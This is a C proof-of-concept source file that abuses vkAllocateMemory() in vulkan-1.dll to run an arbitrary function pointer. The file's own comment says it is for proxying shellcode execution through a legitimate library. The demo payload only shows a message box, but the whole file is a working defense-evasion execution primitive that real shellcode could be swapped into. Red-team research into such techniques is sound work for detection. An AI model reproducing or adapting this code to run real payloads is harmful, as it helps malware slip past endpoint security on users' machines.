/*

    This module uses vkAllocateMemory() from vulkan-1.dll to proxy shellcode execution

    Tested on: Windows 11 24H2
    Author: @whokilleddb

*/

#include <windows.h>
#include <stdio.h>

#define CHECKSUM 0x10ADED040410ADED

#define ERR(x) printf("[-] %s failed with error: 0x%lx\n", x, GetLastError())

typedef LPVOID(__stdcall* pVkAllocateMemory)(LPVOID funcptr);

typedef struct example_struct {
    DWORD64 v1;
    DWORD64 v2;
    DWORD64 v3;
    DWORD64 v4;
    DWORD64 v5;
    DWORD64 v6;
    DWORD64 v7;
    DWORD64 v8;
    DWORD64 v9;
} EG_STR;

void super_evil_function() {
    MessageBoxA(NULL, "Dark Souls2 is an amazing game", "DB Says", 0);
}

int main() {
    EG_STR ex = { 0 };
    
    ex.v1 = (DWORD64) &(ex.v2);
    ex.v2 = CHECKSUM;
    ex.v3 = 0x4343434343434343;
    ex.v4 = 0x4444444444444444;
    ex.v5 = 0x4545454545454545;
    ex.v6 = 0x4646464646464646;
    ex.v7 = 0x4747474747474747;
    ex.v8 = 0x4848484848484848;
    ex.v9 = (DWORD64)super_evil_function;

    HMODULE hVulkan = LoadLibraryW(L"vulkan-1.dll");
    if (hVulkan == NULL) {
        ERR("LoadLibraryW");
        return -1;
    }

    pVkAllocateMemory vkAllocateMemory = (pVkAllocateMemory)(LPVOID)GetProcAddress(hVulkan, "vkAllocateMemory");
    if (vkAllocateMemory == NULL) {
        ERR("vkAllocateMemory");
        return -1;
    }

    printf("[+] vkAllocateMemory() found at: 0x%p\n", vkAllocateMemory);

    vkAllocateMemory(&ex);

    return 0;
}

